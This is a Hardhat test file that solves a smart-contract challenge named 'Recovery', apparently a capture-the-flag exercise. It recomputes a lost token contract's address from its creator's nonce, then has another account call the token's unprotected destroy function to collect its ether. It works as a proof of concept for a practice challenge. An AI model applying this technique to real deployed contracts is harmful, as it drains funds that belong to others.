import { expect } from "chai";
import { ethers,  } from "hardhat";
const{ utils, provider, BigNumber } = ethers

describe("Recovery", () => {
  it("Solves the challenge", async () => {

    const value = utils.parseEther('0.001')

    const [deployer, destroyer] = await ethers.getSigners()
    const contractFactory = await ethers.getContractFactory("Recovery")
    const contract = await contractFactory.connect(deployer).deploy()
    await contract.deployed()

    const initialDestroyerBalance = await provider.getBalance(destroyer.address)

    const generateTokenTx = await contract.connect(deployer).generateToken('NewSimpleToken', 10**6)
    await generateTokenTx.wait()

    const tokenContractAddress = utils.getContractAddress({from : contract.address, nonce: BigNumber.from('1')}); 
		const token = await ethers.getContractAt("SimpleToken", tokenContractAddress);

    await deployer.sendTransaction({
      to: token.address,
      value
    });
    
    const destroyTokenTx = await token.connect(destroyer).destroy(destroyer.address)
    await destroyTokenTx.wait()

    const currentDestroyerBalance = await provider.getBalance(destroyer.address)

    const destroyerBalanceDiff = currentDestroyerBalance.sub(initialDestroyerBalance)
    
    expect(destroyerBalanceDiff).to.be.closeTo(value, utils.parseEther('0.0001'))

  });
});